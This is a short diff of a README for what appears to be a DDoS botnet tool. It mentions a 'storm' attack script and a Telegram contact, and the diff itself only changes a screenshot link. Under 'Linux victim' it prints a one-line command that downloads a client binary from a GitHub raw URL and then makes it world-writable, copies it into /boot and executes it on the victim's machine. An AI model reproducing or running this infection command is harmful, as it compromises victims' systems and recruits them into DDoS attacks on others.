@@ -15,7 +15,7 @@ TG @udbnt
 * DDoS attack uses "storm" script
 
 # Commands
-![image](https://user-images.githubusercontent.com/104208624/203849281-6c1fb2f3-9f5d-4400-88b6-3b03a3636aae.png)
+![image](https://user-images.githubusercontent.com/104208624/203849462-74c44f4f-463b-4549-b0bd-53ba0416bcfc.png)
 
 # Linux victim
 cd /tmp; apt-get update -y; apt-get install curl -y; apt-get install python3 -y; curl -O LClient "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 LClient; cp LClient /boot; ./LClient
